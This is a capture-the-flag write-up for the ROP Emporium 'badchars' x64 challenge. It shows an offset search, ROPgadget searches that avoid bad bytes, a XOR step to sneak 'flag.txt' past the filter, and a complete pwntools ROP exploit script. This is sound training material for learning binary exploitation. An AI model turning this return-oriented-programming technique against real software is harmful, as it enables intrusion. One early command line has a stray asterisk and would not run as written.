# Basic Test:

## Check call system into binary file
```bash
strace ./badchars
```

## Check protection into binary file
```bash
checksec ./badchars
```

	Arch: amd64-64-little
	RELRO: Partial RELRO
	Stack: No canary found
	NX: NX enabled
	PIE: No PIE (0x400000)
	RUNPATH: b'.'

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*40 + "B"*4*' | ./badchars
```

## See output
```bash
sudo dmesg -T
```

	[mer. avril 12 11:33:28 2023] badchars[45666]: segfault at a42424242 ip 0000000a42424242 sp 00007fffb7400930 error 14 in libc.so.6[7ffbc581f000+26000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for two parameters for moving into a section writable

```bash
ROPgadget --binary ./badchars --badbytes '78|67|61|2e' --only 'pop|ret'
```
 
	0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

## Find a section writable
```bash
readelf -S ./badchars | grep -B 1 'WA'
```

	  [23] .data             PROGBITS         0000000000601028  00001028 0000000000000010  0000000000000000  WA       0     0     8

## Find a gadget for moving the file name into .data
```bash
ROPgadget --binary ./badchars --badbytes '78|67|61|2e' --only 'mov|ret'
```

	0x0000000000400634 : mov qword ptr [r13], r12 ; ret

## We need to xor the file name for bypass  them badchars
```python
xored_string = xor("flag.txt", 2)
```

## Find a gadget for one parameter to decode xored file name
```bash
ROPgadget --binary ./badchars --badbytes '78|67|61|2e' --only 'pop|ret'
```

	0x00000000004006a0 : pop r14 ; pop r15 ; ret

## Find a xor gadget for decode xored file name
```bash
ROPgadget --binary ./badchars --badbytes '78|67|61|2e' --only 'xor|ret'
```

	0x0000000000400628 : xor byte ptr [r15], r14b ; ret

## Find a xor gadget for one parameter to call print_file function
```bash
ROPgadget --binary ./badchars --badbytes '78|67|61|2e' --only 'pop|ret'
```

	0x00000000004006a3 : pop rdi ; ret

## Find the address of the print_file function
```bash
pwngdb> disass*usefulFunction
```

	   0x0000000000400617 <+0>:     push   rbp
	   0x0000000000400618 <+1>:     mov    rbp,rsp
	   0x000000000040061b <+4>:     mov    edi,0x4006c4
	   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
	   0x0000000000400625 <+14>:    nop
	   0x0000000000400626 <+15>:    pop    rbp
	   0x0000000000400627 <+16>:    ret

## Python pwntools script
```python
#!/usr/bin/python3
from pwn import *
""" 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
"""
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB: # Set GDBscript below
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: # {"server", "port"}
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # Run locally
        return process([binary] + argv, *a, **kw)
        

def find_eip(payload):
    # Launch process
    p = process(binary)
    p.sendlineafter(">", payload) # If we have a text in get() or read() we need to copy and past in str argument, but if we don't have text in input we can just let ">"
    # Wait for the process to crash
    p.wait()
    
    #eip_offset = cyclic_find(p.corefile.esp) # x86
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4)) # x64
    info("Located $RIP offset at {a}".format(a=eip_offset))
    # Return the offset EIP
    return eip_offset

# Specify GDB script for debugging
gdbscript = '''
continue
'''.format(**locals())

# Setup pwntools for the correct architecture
binary = "./badchars"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(binary, checksec=False)
# Enable verbose logging we can see exactly what is being sent (info/debug)
context.log_level = "info"

# ================================================================
#                         EXPLOIT GOES HERE
# ================================================================

# Start program
io = start()

# Function payload
badchars = "badchars are: 'x', 'g', 'a', '.'"
padding = b"A"*40
pop_r12_pop_r13_pop_r14_pop_r15 = 0x40069c
value_to_xor = 2
xored_string = xor("flag.txt", value_to_xor)
data_section = 0x601044 # 601028 + 16[0x10]
mov_qword_r13_r12 = 0x400634
pop_r14_pop_r15 = 0x4006a0
xor_byte_r15_r14 = 0x400628
pop_rdi = 0x4006a3
call_print_file = 0x400510 # OR print_file@got.plt => [0x601020:8]=0x400516
null = 0x0

info("%s", badchars)
info("padding => %#s", padding)
info("pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret => %#x", pop_r12_pop_r13_pop_r14_pop_r15)
info("xored string by %#d => %#s", value_to_xor, xored_string)
info("data_section  => %#x", data_section)
info("mov qword ptr [r13], r14 ; ret => %#x", mov_qword_r13_r12)
info("pop r14 ; pop r15 ; ret => %#x", pop_r14_pop_r15)
info("xor byte ptr [r15], r14 ; ret => %#x", xor_byte_r15_r14)
info("pop rdi ; ret => %#x", pop_rdi)
info("call print_file@plt => %#x", call_print_file)
info("null byte => %#x", null)

xor_exploit = b""
# Decode xored file name
for c in range(len(xored_string)):
    xor_exploit += pack(pop_r14_pop_r15)
    xor_exploit += pack(value_to_xor)
    xor_exploit += pack(data_section+c)
    xor_exploit += pack(xor_byte_r15_r14)

# Build the payload
payload = flat(
    padding,
    pop_r12_pop_r13_pop_r14_pop_r15,
    xored_string,
    data_section,
    null,
    null,
    mov_qword_r13_r12,
    
    xor_exploit,
    
    pop_rdi,
    data_section,
    call_print_file
)

info("Payload => %#s", payload)

# Send the payload
io.sendlineafter(">", payload) # If we have a text in get() or read() we need to copy and past in str argument, but if we don't have text in input we can just let ">"
io.recvuntil('Thank you!\n')

# Get flag
flag = io.recv()
success(flag)

# Spawn shell
#io.interactive()
```